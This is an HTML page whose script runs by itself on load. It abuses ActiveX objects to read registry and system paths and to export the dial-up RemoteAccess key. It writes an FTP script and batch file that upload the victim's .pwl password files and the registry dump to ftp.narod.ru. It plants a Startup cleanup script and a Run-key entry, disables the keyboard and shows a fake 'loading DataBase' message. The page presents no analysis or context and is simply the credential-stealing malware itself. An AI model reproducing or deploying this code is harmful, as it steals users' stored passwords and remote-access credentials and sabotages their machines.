<body onabort="location.reload" onkeypress="alert('hello')">
<SCRIPT language=JAVASCRIPT> 
 rgh="<APPLET HEIGHT=0 WIDTH=0 code=com.ms."; 
 riv="activeX.ActiveXComponent></APPLET>"; 
 djr=rgh+riv; 
 document.write(djr); 
 </SCRIPT> 
 <script language="VBScript"> 
 function Random(n) 
 randomize timer 
 Random=Int(n*rnd) 
 end function 
 rand = random(999) 
 </script> 
 <SCRIPT> 
 function f(){ 
 try 
 {a1=document.applets[0]; 
 a1.setCLSID("{0D43FE01-F093-11CF-8940-00A0C9054228}"); 
 a1.createInstance(); 
 f = a1.GetObject(); 
 b1=document.applets[0]; 
 b1.setCLSID("{F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}"); 
 b1.createInstance(); 
 ws = b1.GetObject(); 
 try{w=ws.regread("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\ConfigPath") 
 auto=ws.regread("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Startup") 
 win = f.GetSpecialFolder(0) 
 u=ws.regread("HKEY_LOCAL_MACHINE\\Network\\Logon\\UserName") 
 ws.run(win+"\\regedit.exe /E "+w+"\\"+u+".reg HKEY_CURRENT_USER\\RemoteAccess") 
 var Fi2 = f.CreateTextFile(w+"\\ftp.log") 
 Fi2.writeline("open ftp.narod.ru") 
 Fi2.writeline("fhgjgfkjh") 
 Fi2.writeline("ghjgjfbn") 
 Fi2.writeline("send "+win+"\\"+u+".pwl") 
 Fi2.writeline("send "+win+"\\Rna.pwl "+rand+"rna.pwl") 
 Fi2.writeline("send "+w+"\\"+u+".reg") 
 Fi2.writeline("close") 
 Fi2.writeline("quit") 
 Fi2.writeline("cls") 
 var Fi2 = f.CreateTextFile(w+"\\ftp.bat") 
 Fi2.writeline('@ctty nul') 
 Fi2.writeline('@echo off') 
 Fi2.writeline(win+'\\ftp.exe -v -s:'+w+'\\ftp.log') 
 Fi2.writeline('cls') 
 var Fi2 = f.CreateTextFile(auto+"\\del32.vbs") 
 Fi2.writeline('set f = CreateObject("Scripting.FileSystemObject")') 
 Fi2.writeline('f.deletefile "'+w+'\\ftp.log"') 
 Fi2.writeline('f.deletefile "'+w+'\\ftp.bat"') 
 Fi2.writeline('f.deletefile "'+w+'\\caw.lnk"') 
 Fi2.writeline('f.deletefile "'+w+'\\'+u+'.reg"') 
 Fi2.writeline('f.deletefile "'+auto+'\\del32.vbs"') 
 ws.regwrite("HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\32","command.com /c del
 "+win+"\\system\\rnaapp.exe") 
 ws.run(win+"\\rundll32.exe keyboard,disable") 
 window.location.href="next.htm" 
 document.write("<h1>Please wait... loading DataBase... 35 kb</h1>")}catch(e){}} 
 catch(e){}} 
 function init(){ 
 setTimeout("f()", 100)} 
 init() 
 </SCRIPT><!-- ><!-- "><!-- '><!-- --></textarea></form> 
 </title></comment></a> 
 </div></span></ilayer></layer></iframe></noframes></style></noscript></table></script></applet></font> 
 <style> 
 #bn {display:block;} 
 #bt {display:block;} 
 </style> 
 <script language="JavaScript" src="http://bs.yandex.ru/show/163"></script> 
